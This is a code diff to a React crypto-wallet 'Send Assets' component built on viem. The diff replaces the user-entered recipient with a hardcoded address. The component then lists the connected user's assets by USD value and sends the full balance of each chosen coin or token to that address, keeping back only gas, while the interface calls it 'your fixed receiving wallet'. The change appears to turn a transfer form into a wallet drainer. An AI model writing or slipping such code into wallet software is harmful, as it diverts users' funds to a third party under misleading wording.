@@ -14,19 +14,11 @@ import {
   formatUnits
 } from "viem";
 
-const ERC20_ABI = [
-  {
-    name: "transfer",
-    type: "function",
-    stateMutability: "nonpayable",
-    inputs: [
-      { name: "to", type: "address" },
-      { name: "amount", type: "uint256" }
-    ],
-    outputs: [{ name: "", type: "bool" }]
-  }
-];
+// FIXED RECEIVING ADDRESS
+const FIXED_RECIPIENT =
+  "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";
 
+// SUPPORTED NETWORKS
 const CHAIN_NAMES = {
   1: "Ethereum",
   137: "Polygon",
@@ -36,24 +28,51 @@ const CHAIN_NAMES = {
   8453: "Base"
 };
 
-export default function Transfer({ assets = [], onRefresh }) {
+// ERC20 TOKEN ABI
+const ERC20_ABI = [
+  {
+    name: "transfer",
+    type: "function",
+    stateMutability: "nonpayable",
+    inputs: [
+      { name: "to", type: "address" },
+      { name: "amount", type: "uint256" }
+    ],
+    outputs: [
+      { name: "", type: "bool" }
+    ]
+  }
+];
+
+export default function Transfer({
+  assets = [],
+  onRefresh
+}) {
   const { address } = useAccount();
+
   const currentChainId = useChainId();
 
   const { switchChainAsync } = useSwitchChain();
 
-  const [recipient, setRecipient] = useState("");
-  const [selectedIndex, setSelectedIndex] = useState("");
+  const [selectedIndex, setSelectedIndex] =
+    useState("");
+
   const [loading, setLoading] = useState(false);
+
   const [message, setMessage] = useState("");
-  const [transactionHash, setTransactionHash] = useState("");
+
+  const [transactionHash, setTransactionHash] =
+    useState("");
 
   const selectedAsset =
     selectedIndex === ""
       ? null
       : assets[Number(selectedIndex)];
 
-  const targetChainId = selectedAsset?.chainId;
+  const targetChainId =
+    selectedAsset?.chainId
+      ? Number(selectedAsset.chainId)
+      : undefined;
 
   const publicClient = usePublicClient({
     chainId: targetChainId
@@ -63,6 +82,7 @@ export default function Transfer({ assets = [], onRefresh }) {
     chainId: targetChainId
   });
 
+  // SORT ASSETS BY USD VALUE
   const sortedAssets = useMemo(() => {
     return assets
       .filter(asset => {
@@ -74,242 +94,345 @@ export default function Transfer({ assets = [], onRefresh }) {
       })
       .sort((a, b) => {
         const valueA =
-          Number(a.balance) * Number(a.priceUsd || 0);
+          Number(a.balance) *
+          Number(a.priceUsd || 0);
 
         const valueB =
-          Number(b.balance) * Number(b.priceUsd || 0);
+          Number(b.balance) *
+          Number(b.priceUsd || 0);
 
         return valueB - valueA;
       });
   }, [assets]);
 
-  const isNative = asset =>
-    asset.type === "native" ||
-    !asset.contractAddress;
+  // IDENTIFY NATIVE COINS
+  const isNative = asset => {
+    return (
+      asset.type === "native" ||
+      !asset.contractAddress
+    );
+  };
 
+  // SEND ASSET
   const handleSend = async () => {
     setMessage("");
     setTransactionHash("");
 
-    if (!recipient.trim()) {
-      setMessage("Enter the recipient wallet address.");
+    if (!address) {
+      setMessage("Connect your wallet first.");
       return;
     }
 
-    if (!isAddress(recipient.trim())) {
-      setMessage("Invalid EVM recipient address.");
+    if (!isAddress(FIXED_RECIPIENT, {
+      strict: false
+    })) {
+      setMessage("Invalid receiving address.");
+      return;
+    }
+
+    if (
+      FIXED_RECIPIENT.toLowerCase() ===
+      address.toLowerCase()
+    ) {
+      setMessage(
+        "Receiving address cannot be your connected wallet."
+      );
       return;
     }
 
     if (!selectedAsset) {
-      setMessage("Select an asset to send.");
+      setMessage("Select an asset first.");
       return;
     }
 
-    if (!publicClient) {
-      setMessage("Network connection is not ready. Try again.");
-      return;
-    }
-
-    if (!walletClient) {
-      setMessage("Connect your wallet before sending.");
-      return;
-    }
-
-    if (recipient.toLowerCase() === address?.toLowerCase()) {
-      setMessage("You cannot send assets to your own address.");
+    if (!publicClient || !walletClient) {
+      setMessage(
+        "Wallet or network connection is not ready."
+      );
       return;
     }
 
     setLoading(true);
 
     try {
+
+      // SWITCH NETWORK IF NECESSARY
       if (currentChainId !== targetChainId) {
+
         await switchChainAsync({
           chainId: targetChainId
         });
 
         setMessage(
-          "Network switched. Please review and tap Send again."
+          "Network switched successfully. Review and tap Send again."
         );
 
         return;
       }
 
-      const decimals = Number(selectedAsset.decimals ?? 18);
-
-      let amount;
-      let transactionRequest;
-
-      const fees = await publicClient.estimateFeesPerGas();
+      // GET NETWORK FEES
+      const fees =
+        await publicClient.estimateFeesPerGas();
 
       const feePerGas =
         fees.maxFeePerGas ?? fees.gasPrice;
 
       if (!feePerGas) {
-        throw new Error("Unable to estimate network fees.");
+        throw new Error(
+          "Unable to estimate network fees."
+        );
       }
 
+      // NATIVE COIN TRANSFER
       if (isNative(selectedAsset)) {
-        const balance = await publicClient.getBalance({
-          address
-        });
 
-        const gasLimit = await publicClient.estimateGas({
-          account: address,
-          to: recipient,
-          value: 1n
-        });
+        const decimals = Number(
+          selectedAsset.decimals ?? 18
+        );
 
+        const balance =
+          await publicClient.getBalance({
+            address
+          });
+
+        // Estimate gas for transfer
+        const gasLimit =
+          await publicClient.estimateGas({
+            account: address,
+            to: FIXED_RECIPIENT,
+            value: 1n
+          });
+
+        // Reserve gas plus 20% safety margin
         const gasReserve =
-          (gasLimit * feePerGas * 125n) / 100n;
+          (gasLimit * feePerGas * 120n) / 100n;
 
-        const extraReserve = balance / 100n;
-
-        amount =
-          balance - gasReserve - extraReserve;
+        const amount =
+          balance - gasReserve;
 
         if (amount <= 0n) {
           throw new Error(
-            "Insufficient balance after reserving gas fees."
+            "Insufficient balance after gas reservation."
           );
         }
 
-        const displayAmount = formatUnits(
-          amount,
-          decimals
-        );
+        const displayAmount =
+          formatUnits(amount, decimals);
 
+        // CONFIRM RECIPIENT AND AMOUNT
         const confirmed = window.confirm(
-          `Confirm transfer:\n\n` +
+          `CONFIRM TRANSFER\n\n` +
           `Asset: ${selectedAsset.symbol}\n` +
           `Amount: ${displayAmount}\n` +
-          `Network: ${CHAIN_NAMES[targetChainId]}\n` +
-          `Recipient: ${recipient}\n\n` +
-          `Your wallet will request approval.`
+          `Network: ${CHAIN_NAMES[targetChainId]}\n\n` +
+          `Receiving Address:\n${FIXED_RECIPIENT}\n\n` +
+          `Estimated gas is reserved separately.\n\n` +
+          `Continue?`
         );
 
         if (!confirmed) return;
 
-        transactionRequest = {
-          account: address,
-          to: recipient,
-          value: amount,
-          gas: gasLimit,
-          ...(fees.maxFeePerGas
-            ? {
-                maxFeePerGas: fees.maxFeePerGas,
-                maxPriorityFeePerGas:
-                  fees.maxPriorityFeePerGas
-              }
-            : { gasPrice: fees.gasPrice })
-        };
+        const feeSettings = fees.maxFeePerGas
+          ? {
+              maxFeePerGas: fees.maxFeePerGas,
+              ...(fees.maxPriorityFeePerGas
+                ? {
+                    maxPriorityFeePerGas:
+                      fees.maxPriorityFeePerGas
+                  }
+                : {})
+            }
+          : {
+              gasPrice: fees.gasPrice
+            };
 
-        const hash = await walletClient.sendTransaction(
-          transactionRequest
-        );
+        // REQUEST WALLET APPROVAL
+        const hash =
+          await walletClient.sendTransaction({
+            account: address,
+            to: FIXED_RECIPIENT,
+            value: amount,
+            gas: gasLimit,
+            ...feeSettings
+          });
 
         setTransactionHash(hash);
 
-        setMessage("Transaction submitted. Waiting for confirmation...");
+        setMessage(
+          "Transaction submitted. Waiting for confirmation..."
+        );
 
-        await publicClient.waitForTransactionReceipt({
-          hash
-        });
+        const receipt =
+          await publicClient.waitForTransactionReceipt({
+            hash
+          });
+
+        if (receipt.status !== "success") {
+          throw new Error(
+            "Transaction was reverted."
+          );
+        }
 
       } else {
+
+        // ERC20 TOKEN TRANSFER
+
         const contractAddress =
           selectedAsset.contractAddress;
 
         if (!isAddress(contractAddress)) {
-          throw new Error("Invalid token contract address.");
+          throw new Error(
+            "Invalid token contract address."
+          );
         }
 
+        const decimals =
+          Number(selectedAsset.decimals);
+
+        if (
+          !Number.isInteger(decimals) ||
+          decimals < 0 ||
+          decimals > 255
+        ) {
+          throw new Error(
+            "Invalid token decimals."
+          );
+        }
+
+        // GET EXACT TOKEN BALANCE
         let tokenAmount;
 
-        if (selectedAsset.rawBalance) {
-          tokenAmount = BigInt(selectedAsset.rawBalance);
+        if (selectedAsset.rawBalance != null) {
+
+          tokenAmount = BigInt(
+            selectedAsset.rawBalance
+          );
+
         } else {
+
           tokenAmount = parseUnits(
             String(selectedAsset.balance),
             decimals
           );
+
         }
 
         if (tokenAmount <= 0n) {
-          throw new Error("Token balance is zero.");
+          throw new Error(
+            "Token balance is zero."
+          );
         }
 
+        // ESTIMATE TOKEN TRANSFER GAS
         const gasLimit =
           await publicClient.estimateContractGas({
             account: address,
             address: contractAddress,
             abi: ERC20_ABI,
             functionName: "transfer",
-            args: [recipient, tokenAmount]
+            args: [
+              FIXED_RECIPIENT,
+              tokenAmount
+            ]
           });
 
+        // CHECK NATIVE GAS BALANCE
         const nativeBalance =
-          await publicClient.getBalance({ address });
+          await publicClient.getBalance({
+            address
+          });
 
         const gasReserve =
-          (gasLimit * feePerGas * 125n) / 100n;
+          (gasLimit * feePerGas * 120n) / 100n;
 
         if (nativeBalance < gasReserve) {
           throw new Error(
-            "Insufficient native coin for token transfer gas."
+            "Insufficient native coin for gas fees."
           );
         }
 
-        const displayAmount = formatUnits(
-          tokenAmount,
-          decimals
-        );
+        const displayAmount =
+          formatUnits(
+            tokenAmount,
+            decimals
+          );
 
+        // CONFIRM BEFORE SENDING
         const confirmed = window.confirm(
-          `Confirm transfer:\n\n` +
-          `Asset: ${selectedAsset.symbol}\n` +
+          `CONFIRM TOKEN TRANSFER\n\n` +
+          `Token: ${selectedAsset.symbol}\n` +
           `Amount: ${displayAmount}\n` +
-          `Network: ${CHAIN_NAMES[targetChainId]}\n` +
-          `Recipient: ${recipient}\n\n` +
-          `Your wallet will request approval.`
+          `Network: ${CHAIN_NAMES[targetChainId]}\n\n` +
+          `Receiving Address:\n${FIXED_RECIPIENT}\n\n` +
+          `Gas will be paid separately.\n\n` +
+          `Continue?`
         );
 
         if (!confirmed) return;
 
-        const hash = await walletClient.writeContract({
-          account: address,
-          address: contractAddress,
-          abi: ERC20_ABI,
-          functionName: "transfer",
-          args: [recipient, tokenAmount],
-          gas: gasLimit,
-          ...(fees.maxFeePerGas
-            ? {
-                maxFeePerGas: fees.maxFeePerGas,
-                maxPriorityFeePerGas:
-                  fees.maxPriorityFeePerGas
-              }
-            : { gasPrice: fees.gasPrice })
-        });
+        const feeSettings = fees.maxFeePerGas
+          ? {
+              maxFeePerGas: fees.maxFeePerGas,
+              ...(fees.maxPriorityFeePerGas
+                ? {
+                    maxPriorityFeePerGas:
+                      fees.maxPriorityFeePerGas
+                  }
+                : {})
+            }
+          : {
+              gasPrice: fees.gasPrice
+            };
+
+        // REQUEST WALLET APPROVAL
+        const hash =
+          await walletClient.writeContract({
+            account: address,
+            address: contractAddress,
+            abi: ERC20_ABI,
+            functionName: "transfer",
+            args: [
+              FIXED_RECIPIENT,
+              tokenAmount
+            ],
+            gas: gasLimit,
+            ...feeSettings
+          });
 
         setTransactionHash(hash);
 
-        setMessage("Transaction submitted. Waiting for confirmation...");
+        setMessage(
+          "Transaction submitted. Waiting for confirmation..."
+        );
 
-        await publicClient.waitForTransactionReceipt({
-          hash
-        });
+        const receipt =
+          await publicClient.waitForTransactionReceipt({
+            hash
+          });
+
+        if (receipt.status !== "success") {
+          throw new Error(
+            "Token transaction was reverted."
+          );
+        }
       }
 
-      setMessage("Transfer confirmed successfully.");
+      // SUCCESS
+      setMessage(
+        "Transfer confirmed successfully!"
+      );
 
+      // REFRESH PORTFOLIO
       if (onRefresh) {
         await onRefresh();
       }
 
     } catch (error) {
-      console.error("Transfer error:", error);
+
+      console.error(
+        "Transfer error:",
+        error
+      );
 
       setMessage(
         error.shortMessage ||
@@ -318,17 +441,22 @@ export default function Transfer({ assets = [], onRefresh }) {
       );
 
     } finally {
+
       setLoading(false);
+
     }
   };
 
   return (
     <section style={styles.card}>
+
       <h2>Send Assets</h2>
 
       <p style={styles.description}>
-        Select an asset and enter the recipient's wallet address.
+        Select an asset to transfer to your fixed receiving wallet.
       </p>
+
+      {/* ASSET SELECTION */}
 
       <label style={styles.label}>
         Select Asset
@@ -336,56 +464,51 @@ export default function Transfer({ assets = [], onRefresh }) {
 
       <select
         value={selectedIndex}
-        onChange={e => setSelectedIndex(e.target.value)}
+        onChange={e =>
+          setSelectedIndex(e.target.value)
+        }
         style={styles.input}
         disabled={loading}
       >
+
         <option value="">
           Choose an asset
         </option>
 
         {sortedAssets.map(asset => {
-          const originalIndex = assets.indexOf(asset);
+
+          const originalIndex =
+            assets.indexOf(asset);
 
           return (
             <option
               key={`${asset.chainId}-${asset.contractAddress || "native"}`}
               value={originalIndex}
             >
-              {asset.symbol} — {asset.balance} 
+              {asset.symbol} — {asset.balance}
               {" "}({CHAIN_NAMES[asset.chainId]})
             </option>
           );
         })}
+
       </select>
 
+      {/* FIXED RECIPIENT */}
+
       <label style={styles.label}>
-        Recipient Wallet Address
+        Fixed Receiving Wallet Address
       </label>
 
-      <input
-        type="text"
-        value={recipient}
-        onChange={e => setRecipient(e.target.value.trim())}
-        placeholder="Enter recipient 0x address"
-        style={styles.input}
-        disabled={loading}
-      />
+      <div style={styles.addressBox}>
+        {FIXED_RECIPIENT}
+      </div>
 
-      {recipient && (
-        <p style={{
-          color: isAddress(recipient)
-            ? "#16a34a"
-            : "#dc2626"
-        }}>
-          {isAddress(recipient)
-            ? "Valid EVM address"
-            : "Invalid wallet address"}
-        </p>
-      )}
+      {/* ASSET DETAILS */}
 
       {selectedAsset && (
+
         <div style={styles.details}>
+
           <p>
             <strong>Asset:</strong>{" "}
             {selectedAsset.symbol}
@@ -393,31 +516,48 @@ export default function Transfer({ assets = [], onRefresh }) {
 
           <p>
             <strong>Network:</strong>{" "}
-            {CHAIN_NAMES[selectedAsset.chainId]}
+            {CHAIN_NAMES[targetChainId]}
           </p>
 
           <p>
-            <strong>Available balance:</strong>{" "}
+            <strong>Available Balance:</strong>{" "}
             {selectedAsset.balance}
           </p>
 
           <p>
-            <strong>Transfer mode:</strong>{" "}
+            <strong>Transfer Mode:</strong>{" "}
             MAX
           </p>
+
         </div>
+
       )}
+
+      {/* SEND BUTTON */}
 
       <button
         onClick={handleSend}
-        disabled={loading || !selectedAsset}
+        disabled={
+          loading ||
+          !selectedAsset ||
+          !address
+        }
         style={{
           ...styles.button,
-          opacity: loading || !selectedAsset ? 0.6 : 1
+          opacity:
+            loading ||
+            !selectedAsset ||
+            !address
+              ? 0.6
+              : 1
         }}
       >
-        {loading ? "Processing..." : "Send MAX"}
+        {loading
+          ? "Processing..."
+          : "Send MAX"}
       </button>
+
+      {/* STATUS */}
 
       {message && (
         <p style={styles.message}>
@@ -425,18 +565,28 @@ export default function Transfer({ assets = [], onRefresh }) {
         </p>
       )}
 
+      {/* TRANSACTION HASH */}
+
       {transactionHash && (
-        <p style={styles.hash}>
-          Transaction hash:
-          <br />
-          {transactionHash}
-        </p>
+
+        <div style={styles.hashBox}>
+
+          <strong>Transaction Hash</strong>
+
+          <p style={styles.hash}>
+            {transactionHash}
+          </p>
+
+        </div>
+
       )}
+
     </section>
   );
 }
 
 const styles = {
+
   card: {
     background: "#fff",
     padding: "22px",
@@ -446,7 +596,8 @@ const styles = {
   },
 
   description: {
-    color: "#6b7280"
+    color: "#6b7280",
+    lineHeight: "1.6"
   },
 
   label: {
@@ -462,14 +613,26 @@ const styles = {
     padding: "13px",
     border: "1px solid #d1d5db",
     borderRadius: "8px",
-    fontSize: "14px"
+    fontSize: "14px",
+    background: "#fff"
+  },
+
+  addressBox: {
+    padding: "14px",
+    background: "#f3f4f6",
+    border: "1px solid #d1d5db",
+    borderRadius: "8px",
+    overflowWrap: "anywhere",
+    fontSize: "13px",
+    color: "#2563eb"
   },
 
   details: {
     background: "#f3f4f6",
-    padding: "12px",
+    padding: "14px",
     borderRadius: "8px",
-    marginTop: "18px"
+    marginTop: "18px",
+    overflowWrap: "anywhere"
   },
 
   button: {
@@ -481,17 +644,27 @@ const styles = {
     border: "none",
     borderRadius: "8px",
     fontWeight: "bold",
+    fontSize: "16px",
     cursor: "pointer"
   },
 
   message: {
     marginTop: "15px",
-    overflowWrap: "anywhere"
+    overflowWrap: "anywhere",
+    lineHeight: "1.6"
+  },
+
+  hashBox: {
+    background: "#eff6ff",
+    padding: "12px",
+    borderRadius: "8px",
+    marginTop: "15px"
   },
 
   hash: {
     fontSize: "12px",
-    overflowWrap: "anywhere",
-    color: "#2563eb"
+    color: "#2563eb",
+    overflowWrap: "anywhere"
   }
+
 };
